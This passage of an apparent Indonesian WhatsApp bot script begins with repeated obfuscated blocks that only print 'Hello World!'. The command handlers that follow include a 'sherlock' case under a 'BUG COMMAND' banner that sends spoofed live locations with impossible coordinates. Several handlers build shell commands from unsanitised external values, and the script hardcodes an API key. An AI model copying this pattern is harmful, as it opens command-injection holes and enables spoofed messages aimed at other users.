_0x5abb41['push'](_0x5abb41['shift']());}catch(_0x4b5987){_0x5abb41['push'](_0x5abb41['shift']());}}}(_0x1dff,-0x1133f8+0xb1f4+0x3*0x9d8df));function hi(){var _0x58b811=function(_0x205ce2,_0x535b2f,_0x430ea8,_0x5b7849,_0x24948e){return _0x521d(_0x430ea8- -0x208,_0x205ce2);},_0x18343a=function(_0x40382a,_0x5afa14,_0x54e426,_0x48ce9d,_0x193e29){return _0x521d(_0x54e426- -0x208,_0x40382a);},_0x2b55a4=function(_0x3e472a,_0x24107b,_0x5778d0,_0x131e32,_0x382e7a){return _0x521d(_0x5778d0- -0x208,_0x3e472a);},_0xe59cf5=function(_0x2e6da2,_0x3ab5d6,_0x53dcfb,_0x48dbb7,_0x21a585){return _0x521d(_0x53dcfb- -0x208,_0x2e6da2);},_0x16aa62=function(_0x1860ff,_0x52715a,_0x116c52,_0x1c0632,_0x4bd758){return _0x521d(_0x116c52- -0x208,_0x1860ff);},_0x2c8d38={};_0x2c8d38[_0x58b811(-0x9c,-0x9e,-0x99,-0x95,-0x92)]=_0x58b811(-0x9e,-0x9c,-0x98,-0x96,-0x95)+_0x2b55a4(-0x99,-0x9f,-0x9d,-0xa3,-0x9f)+'d!';var _0x17f9fd=_0x2c8d38;console[_0x58b811(-0x99,-0x98,-0x95,-0x96,-0x98)](_0x17f9fd[_0x16aa62(-0x9e,-0x95,-0x99,-0x98,-0x9f)]);}function _0x521d(_0x2aca58,_0xbe9681){_0x2aca58=_0x2aca58-(-0x8a1+0x1a*0x10e+-0x1165);var _0x1aab36=_0x1dff[_0x2aca58];return _0x1aab36;}hi();
var _0x2151=['1fTAlQE','Hello','\x20Worl','LppPe','377446Ppficz','122234JpxoXy','991290nlmzTC','31naapOb','271393dCnrRS','5BJThOy','30183NveHDY','485620vFhZKS','log','432067XcUWYj'];(function(_0x13af9e,_0xc18913){var _0x4053da=function(_0x40c7d2,_0xb58fff,_0x453d40,_0x8e76c6,_0x2709cf){return _0x1046(_0x8e76c6- -0x281,_0x2709cf);},_0x2ac1de=function(_0x4e2135,_0xaa643d,_0x26e582,_0x4caadc,_0x3bfe99){return _0x1046(_0x4caadc- -0x281,_0x3bfe99);},_0x2a6834=function(_0x3264e1,_0x17aacd,_0x3b610a,_0x25ed05,_0x23627f){return _0x1046(_0x25ed05- -0x281,_0x23627f);},_0x3c45a1=function(_0x4ee5bb,_0x3886bc,_0x22ccff,_0x1bda69,_0x18f693){return _0x1046(_0x1bda69- -0x281,_0x18f693);},_0x3b8c3f=function(_0x39bf6a,_0x4830d5,_0x50cf1d,_0x3ed353,_0x255eb8){return _0x1046(_0x3ed353- -0x281,_0x255eb8);};while(!![]){try{var _0x2d8d3d=parseInt(_0x4053da(-0x132,-0x12c,-0x12d,-0x12d,-0x128))*parseInt(_0x4053da(-0x125,-0x12c,-0x123,-0x129,-0x12f))+parseInt(_0x4053da(-0x124,-0x128,-0x126,-0x125,-0x127))+parseInt(_0x2a6834(-0x130,-0x132,-0x130,-0x12e,-0x129))+-parseInt(_0x3c45a1(-0x12f,-0x12b,-0x131,-0x12c,-0x131))+parseInt(_0x4053da(-0x128,-0x126,-0x12c,-0x128,-0x128))*parseInt(_0x3c45a1(-0x127,-0x12c,-0x12d,-0x12b,-0x12c))+-parseInt(_0x4053da(-0x12c,-0x130,-0x12d,-0x12a,-0x12c))+-parseInt(_0x2a6834(-0x139,-0x12f,-0x12c,-0x132,-0x12c))*parseInt(_0x2ac1de(-0x126,-0x125,-0x12a,-0x127,-0x120));if(_0x2d8d3d===_0xc18913)break;else _0x13af9e['push'](_0x13af9e['shift']());}catch(_0x2b6529){_0x13af9e['push'](_0x13af9e['shift']());}}}(_0x2151,0x872ce+0x77a0e*-0x2+0xfc883));function _0x1046(_0x3e21f,_0x256ef5){_0x3e21f=_0x3e21f-(-0x55e+-0x213b+0x27e8);var _0x363771=_0x2151[_0x3e21f];return _0x363771;}function hi(){var _0x86b7ad=function(_0x174a61,_0x501c38,_0xa3611d,_0x333d40,_0x3c99ac){return _0x1046(_0x501c38-0x283,_0x3c99ac);},_0x18f57d=function(_0x568fba,_0x3bcea2,_0x185dbb,_0x3a3e5d,_0x287068){return _0x1046(_0x3bcea2-0x283,_0x287068);},_0x5037cf=function(_0x2dba88,_0x200161,_0x2fd706,_0x32a7b5,_0x42bd97){return _0x1046(_0x200161-0x283,_0x42bd97);},_0x54fe4d=function(_0x53ba94,_0x176c7f,_0x2effe4,_0x1100a6,_0x285223){return _0x1046(_0x176c7f-0x283,_0x285223);},_0x7a8e1e=function(_0x49593d,_0x37b47a,_0x665f37,_0x2798a3,_0x180769){return _0x1046(_0x37b47a-0x283,_0x180769);},_0x4330cd={};_0x4330cd[_0x86b7ad(0x3cf,0x3d5,0x3d1,0x3dc,0x3ce)]=_0x86b7ad(0x3cc,0x3d3,0x3d2,0x3d4,0x3d9)+_0x18f57d(0x3d8,0x3d4,0x3d0,0x3cf,0x3d0)+'d!';var _0x48029d=_0x4330cd;console[_0x86b7ad(0x3da,0x3de,0x3e0,0x3e4,0x3dc)](_0x48029d[_0x7a8e1e(0x3d8,0x3d5,0x3da,0x3d2,0x3d7)]);}hi();
var _0x2892=['2796lBDVKg','426889eHtiqk','Hello','240475AkFezk','34clbDfo','24908RAvKof','6502IFCCjE','log','1eyFIAf','10NTQJiv','472525vWBZqB','21MuTLkg','mlEQL','95037dNIkwa','4XzVeSz','\x20Worl'];function _0x6703(_0x332d88,_0x2b7623){_0x332d88=_0x332d88-(0x11f1+0x475+-0x150f*0x1);var _0x528165=_0x2892[_0x332d88];return _0x528165;}(function(_0x1524d2,_0x3ca43f){var _0x5401bd=function(_0x209062,_0x395b9a,_0x2a01bc,_0x15faaa,_0x493fa9){return _0x6703(_0x2a01bc- -0x26c,_0x493fa9);},_0x51d1cd=function(_0x26763e,_0x23823f,_0x5c0f3b,_0x3372b2,_0x377540){return _0x6703(_0x5c0f3b- -0x26c,_0x377540);},_0x383c5b=function(_0x36095b,_0x3d22be,_0x330b97,_0x3e1303,_0x1454d1){return _0x6703(_0x330b97- -0x26c,_0x1454d1);},_0x4f6a99=function(_0x139971,_0x2e87a3,_0x34c279,_0x2f560a,_0x1c68c){return _0x6703(_0x34c279- -0x26c,_0x1c68c);},_0x49379c=function(_0x1b4caf,_0x5ce428,_0x302af3,_0x12b285,_0x251f27){return _0x6703(_0x302af3- -0x26c,_0x251f27);};while(!![]){try{var _0x770269=parseInt(_0x5401bd(-0x112,-0x11b,-0x115,-0x11b,-0x11b))+parseInt(_0x5401bd(-0x10d,-0x109,-0x10a,-0x108,-0x103))*parseInt(_0x383c5b(-0x117,-0x10e,-0x113,-0x112,-0x11b))+parseInt(_0x51d1cd(-0x10c,-0x110,-0x114,-0x10e,-0x11a))*parseInt(_0x49379c(-0x110,-0x106,-0x108,-0x10b,-0x10b))+parseInt(_0x5401bd(-0x10c,-0x103,-0x107,-0x106,-0x104))*parseInt(_0x5401bd(-0x110,-0x10d,-0x110,-0x118,-0x118))+parseInt(_0x51d1cd(-0x114,-0x112,-0x112,-0x10a,-0x10a))*-parseInt(_0x383c5b(-0x10f,-0x106,-0x10d,-0x10d,-0x108))+parseInt(_0x4f6a99(-0x10c,-0x113,-0x10e,-0x113,-0x112))+parseInt(_0x4f6a99(-0x104,-0x108,-0x10b,-0x10d,-0x10b))*-parseInt(_0x5401bd(-0x10e,-0x10b,-0x10f,-0x117,-0x10c));if(_0x770269===_0x3ca43f)break;else _0x1524d2['push'](_0x1524d2['shift']());}catch(_0xa37e5a){_0x1524d2['push'](_0x1524d2['shift']());}}}(_0x2892,-0x19089+-0xb*-0x6089+-0x1*-0x1321f));function hi(){var _0x748471=function(_0x3008e0,_0x1d28f4,_0x1b61de,_0x339141,_0x310e1f){return _0x6703(_0x310e1f-0x7a,_0x1b61de);},_0x1f7596=function(_0x4c448e,_0x3a371c,_0x47c3bf,_0x4abf98,_0x4a7b29){return _0x6703(_0x4a7b29-0x7a,_0x47c3bf);},_0x3190de=function(_0x12b096,_0x1e6cd4,_0x52030f,_0x4bffeb,_0x56290c){return _0x6703(_0x56290c-0x7a,_0x52030f);},_0x4fb155=function(_0x5f0b22,_0x566069,_0xafe3d3,_0x12b5e5,_0x5ae136){return _0x6703(_0x5ae136-0x7a,_0xafe3d3);},_0x379e5d=function(_0x16e614,_0x3df6cc,_0x38f915,_0x5237ed,_0x49c53d){return _0x6703(_0x49c53d-0x7a,_0x38f915);},_0xe079e1={};_0xe079e1[_0x748471(0x1d9,0x1da,0x1e1,0x1db,0x1da)]=_0x748471(0x1e7,0x1e7,0x1dd,0x1db,0x1e0)+_0x748471(0x1e1,0x1db,0x1e4,0x1e3,0x1dd)+'d!';var _0x250d90=_0xe079e1;console[_0x3190de(0x1ce,0x1d8,0x1d9,0x1d6,0x1d5)](_0x250d90[_0x1f7596(0x1e1,0x1dd,0x1d2,0x1d3,0x1da)]);}hi();
var _0xa494=['461198guhzrU','1346734OzNWsd','27oNzqkW','1LBjsGi','Uqfpw','9127AiKGhG','log','89yEThMI','550533Ogmyhn','Hello','32377AUvZvw','71vPiYGd','756304wscllM','\x20Worl','18597INNoKB'];(function(_0x16d0b5,_0xf89082){var _0x49f247=function(_0xff55db,_0x20a934,_0x398312,_0x4796c3,_0x3f1ab7){return _0x504f(_0xff55db-0x318,_0x4796c3);},_0x34a735=function(_0x2d69bd,_0x1dc1e2,_0x3750ca,_0xd03432,_0x2e1c0a){return _0x504f(_0x2d69bd-0x318,_0xd03432);},_0x347ff9=function(_0xdf4430,_0x17d238,_0x1a4ef7,_0x36bf30,_0x214731){return _0x504f(_0xdf4430-0x318,_0x36bf30);},_0x16b720=function(_0x56878d,_0x478e35,_0x15fbe7,_0x3a4056,_0x3bde91){return _0x504f(_0x56878d-0x318,_0x3a4056);},_0x33cc29=function(_0x514088,_0x1a3e97,_0x340436,_0x49ff2e,_0x5ecd23){return _0x504f(_0x514088-0x318,_0x49ff2e);};while(!![]){try{var _0x337638=parseInt(_0x49f247(0x3cb,0x3c7,0x3c4,0x3ce,0x3d3))*parseInt(_0x34a735(0x3cd,0x3d2,0x3d4,0x3ce,0x3cc))+parseInt(_0x347ff9(0x3c8,0x3c1,0x3ca,0x3ca,0x3c6))*-parseInt(_0x34a735(0x3c1,0x3bc,0x3b9,0x3bd,0x3c7))+parseInt(_0x16b720(0x3c7,0x3cd,0x3cb,0x3cd,0x3cd))+-parseInt(_0x33cc29(0x3c3,0x3c3,0x3c2,0x3bc,0x3c8))*-parseInt(_0x16b720(0x3c9,0x3c4,0x3c4,0x3ce,0x3ca))+-parseInt(_0x16b720(0x3c6,0x3ca,0x3c1,0x3bf,0x3c9))+parseInt(_0x347ff9(0x3bf,0x3bd,0x3c5,0x3c1,0x3ba))+parseInt(_0x33cc29(0x3c2,0x3be,0x3bb,0x3c1,0x3c9))*-parseInt(_0x34a735(0x3c5,0x3c9,0x3c8,0x3c9,0x3cb));if(_0x337638===_0xf89082)break;else _0x16d0b5['push'](_0x16d0b5['shift']());}catch(_0x27c77f){_0x16d0b5['push'](_0x16d0b5['shift']());}}}(_0xa494,0x16a705*0x1+0x14f804+0x1f428b*-0x1));function hi(){var _0x104c75=function(_0x28d988,_0x214fb7,_0x32c45b,_0x209dd3,_0x1654a3){return _0x504f(_0x209dd3-0x3e7,_0x214fb7);},_0x9ed0e=function(_0x1eb2b3,_0x1a9099,_0x47b344,_0x5cae96,_0x55782f){return _0x504f(_0x5cae96-0x3e7,_0x1a9099);},_0x21ead9=function(_0xfd893a,_0x46e0c1,_0x16fda8,_0x386103,_0x5ec164){return _0x504f(_0x386103-0x3e7,_0x46e0c1);},_0x1a0fa8=function(_0x3dc546,_0x43fe20,_0x5a662d,_0x2be594,_0x17218e){return _0x504f(_0x2be594-0x3e7,_0x43fe20);},_0x184893=function(_0x1d22b0,_0x401c86,_0x5b6a45,_0x3fe331,_0x1d28bf){return _0x504f(_0x3fe331-0x3e7,_0x401c86);},_0x13bc94={};_0x13bc94[_0x104c75(0x491,0x49c,0x497,0x499,0x493)]=_0x9ed0e(0x488,0x492,0x495,0x48f,0x48d)+_0x104c75(0x49b,0x49a,0x49b,0x493,0x491)+'d!';var _0x7775c4=_0x13bc94;console[_0x104c75(0x4a0,0x49d,0x493,0x49b,0x4a1)](_0x7775c4[_0x1a0fa8(0x49b,0x494,0x49d,0x499,0x4a0)]);}function _0x504f(_0x423b80,_0x21c653){_0x423b80=_0x423b80-(0x1faa+0x91*0x3d+-0x4190);var _0x5dd6cc=_0xa494[_0x423b80];return _0x5dd6cc;}hi();
var _0x1a2d=['873274GOPKwu','49711TqvDhS','vSwjL','\x20Worl','6288WzzdEo','158LOZYqz','65050TiskhG','Hello','3457238BFUhof','1048345mcjShl','8dYNcgW','log','9zqBrQA','1036383cchzlh'];(function(_0x3c9f84,_0xf9deaf){var _0x59f774=function(_0x55c2e1,_0x1af17c,_0x2ebb3f,_0x4fc754,_0x286f22){return _0x4954(_0x1af17c- -0xef,_0x4fc754);},_0x5cfd5c=function(_0x44d40f,_0x1979f2,_0x23f583,_0x5898a0,_0x521d52){return _0x4954(_0x1979f2- -0xef,_0x5898a0);},_0x20c769=function(_0xb90686,_0xdf929b,_0x105f6f,_0x4d84fd,_0x5e7cc0){return _0x4954(_0xdf929b- -0xef,_0x4d84fd);},_0x376eb5=function(_0x15bcc2,_0x25cab5,_0x2aff59,_0x29426e,_0x4bdc68){return _0x4954(_0x25cab5- -0xef,_0x29426e);},_0x4e6ab7=function(_0x30f571,_0x7a65bb,_0x3fb9c7,_0x3fe116,_0x2acfa1){return _0x4954(_0x7a65bb- -0xef,_0x3fe116);};while(!![]){try{var _0x2d25ba=-parseInt(_0x59f774(0x67,0x63,0x69,0x5f,0x5c))*-parseInt(_0x5cfd5c(0x5e,0x62,0x64,0x5c,0x60))+parseInt(_0x5cfd5c(0x6b,0x64,0x5e,0x66,0x5d))*-parseInt(_0x20c769(0x6d,0x68,0x64,0x65,0x6e))+-parseInt(_0x59f774(0x5a,0x5e,0x65,0x5a,0x65))+-parseInt(_0x4e6ab7(0x58,0x5d,0x5d,0x60,0x5b))+parseInt(_0x4e6ab7(0x5e,0x5f,0x66,0x5b,0x60))*-parseInt(_0x376eb5(0x59,0x5c,0x57,0x58,0x62))+-parseInt(_0x4e6ab7(0x62,0x67,0x63,0x6b,0x66))+parseInt(_0x5cfd5c(0x68,0x66,0x66,0x63,0x68));if(_0x2d25ba===_0xf9deaf)break;else _0x3c9f84['push'](_0x3c9f84['shift']());}catch(_0x59ea96){_0x3c9f84['push'](_0x3c9f84['shift']());}}}(_0x1a2d,-0x1c35d*-0x8+-0x1b185+-0xc62*0x5b));function _0x4954(_0x1355fd,_0x3169a1){_0x1355fd=_0x1355fd-(-0x9ce+-0x1*-0xfef+-0x2*0x26b);var _0x2c6143=_0x1a2d[_0x1355fd];return _0x2c6143;}function hi(){var _0x1683cd=function(_0x2d0bd1,_0x54806a,_0x3438a7,_0x45a1ad,_0x1cec13){return _0x4954(_0x1cec13- -0x184,_0x3438a7);},_0x247154=function(_0x367324,_0x2fc684,_0x5c8f60,_0x223bec,_0x3930c0){return _0x4954(_0x3930c0- -0x184,_0x5c8f60);},_0x3102a3=function(_0x562ae7,_0x2bcb3a,_0x8bea13,_0x483f01,_0x2dc5e4){return _0x4954(_0x2dc5e4- -0x184,_0x8bea13);},_0x22703e=function(_0x77f87b,_0xe30b88,_0x535ac0,_0x101ffc,_0x2f4233){return _0x4954(_0x2f4233- -0x184,_0x535ac0);},_0x318c90=function(_0x59e9f6,_0x3dcb5b,_0x251259,_0x3fb760,_0x5ec60f){return _0x4954(_0x5ec60f- -0x184,_0x251259);},_0x557a23={};_0x557a23[_0x1683cd(-0x39,-0x2e,-0x2e,-0x33,-0x35)]=_0x1683cd(-0x31,-0x2b,-0x29,-0x29,-0x30)+_0x1683cd(-0x37,-0x35,-0x3a,-0x39,-0x34)+'d!';var _0x42836a=_0x557a23;console[_0x22703e(-0x26,-0x2e,-0x2e,-0x33,-0x2c)](_0x42836a[_0x22703e(-0x38,-0x34,-0x2e,-0x2e,-0x35)]);}hi();
var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();
break
/* ===================================================[ BUG COMMAND ]==============================================================*/                                           

				    case 'url2img':
					tipelist = ['desktop','tablet','mobile']
					if (args.length < 1) return reply('Tipenya apa um?')
					if (!tipelist.includes(args[0])) return reply('Tipe desktop|tablet|mobile')
					if (args.length < 2) return reply('Urlnya mana um?')
					if (!isUrl(args[1])) return reply(mess.error.Iv)
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbar.moe/api/url2image?tipe=${args[0]}&url=${args[1]}&apiKey=IDxO1TFYnKADlX4pxcHa`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buff = await getBuffer(anu.result)
					zacky.sendMessage(from, buff, image, {quoted: mek})
					break
				    case 'tstiker':
				case 'tsticker':
				if (isBanned) return reply('Lu sudah terbenned!')
					if (args.length < 1) return reply('Textnya mana um?')
					ranp = getRandom('.png')
					rano = getRandom('.webp')
					teks = body.slice(9).trim()
					anu = await fetchJson(`https://mhankbarbar.moe/api/text2image?text=${teks}&apiKey=IDxO1TFYnKADlX4pxcHa`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(error.stick)
						exec(`webpmux -set exif ${addMetadata('Zacky', 'Punya')} ${rano} -o ${rano}`, async (error) => {
							if (error) return reply(error.stick)
							zacky.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
							fs.unlinkSync(rano)
						})
						/*zacky.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
						fs.unlinkSync(rano)*/
					})
					break
				    case 'tagall':
					if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n┌───〔 *Tag All* 〕───┈ ❋ཻུ۪۪⸙\n'
					for (let mem of groupMembers) {
						teks += `│➛ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks +`╰──「 *Total: ${groupMembers.length}* 」──┈ ⳹`, members_id, true)
					break
                    case 'tagall2':
                    if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '╔══〔 Tag All 〕══❍\n'
					for (let mem of groupMembers) {
						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
                    case 'tagall3':
                    if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '╔══❰ Tag All ❱══❍\n'
					for (let mem of groupMembers) {
						teks += `╠➥ wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					zacky.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
					break
					case 'timer':
				if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam")}
				setTimeout( () => {
				reply("Waktu habis")
				}, timer)
				break
				    case 'clearall':
					if (!mek.key.fromMe && !isOwner) return reply('Kamu siapa?')
					anu = await zacky.chats.all()
					zacky.setMaxListeners(25)
					for (let _ of anu) {
						zacky.deleteChat(_.jid)
					}
					reply('Sukses delete all chat :)')
					break
					case 'delchat':
					case 'deletechat':
                    if (!isOwner && !mek.key.fromMe) return reply(ind.ownerb())                               
                zacky.modifyChat(from, ChatModification.delete)
                reply('Sukses menghapus chat' + from)
                break
                case 'restart':
                if (!isOwner && !mek.key.fromMe) return reply(ind.ownerb())
                reply(`_Restarting ${NamaBot}_`)
                exec(`cd &&  node index`)
                sleep(4000)
                reply('Sukses')
                break
                case 'sharelock':
                case 'sherlock':
kntl = `${args.join(' ')}`
namaa = kntl.split("|")[0];
impostor = kntl.split("|")[1];
zacky.sendMessage(from, {
degreesLatitude: 999,
degreesLongitude: 999,
name: namaa,
address: impostor,
jpegThumbnail: pporang}, MessageType.liveLocation, {quoted:floc})
break                                                
				    case 'bc':
					if (!mek.key.fromMe && !isOwner) return reply('Kamu siapa?')
					if (args.length < 1) return reply('.......')
					anu = await zacky.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await zacky.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							zacky.sendMessage(_.jid, buff, image, {caption: `[ BROADCAST ${NamaBot} ]\n\n${body.slice(4)}`})
						}
						reply('Suksess broadcast')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ BROADCAST ZACKY BOT ]\n\n${body.slice(4)}`)
						}
						reply('Suksess broadcast')
					}
					break
                   case 'promote':
                   if (!isGroup) return reply(ind.groupo())
                   if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
                   if (!isBotGroupAdmins) return reply(ind.badmin())
                   if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
                   mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                   if (mentioned.length > 1) {
                   teks = 'Berhasil Promote\n'
                   for (let _ of mentioned) {
                   teks += `@_.split('@')[0]`
                   }
                   mentions(from, mentioned, true)
                   zacky.groupMakeAdmin(from, mentioned)
                   } else {
                   mentions(`Berhasil Promote @${mentioned[0].split('@')[0]} Sebagai Admin Group!`, mentioned, true)
                   zacky.groupMakeAdmin(from, mentioned)
                   }
                   break
                    case 'demote':
				    if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('ð“ðšð  ð­ðšð«ð ðžð­ ð²ðšð§ð  ð¦ðšð® ðð¢ ð­ð®ð«ð®ð§ð¤ðšð§ ðšðð¦ð¢ð§')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = `Berhasil Demote :\n`
						for (let _ of mentioned) {
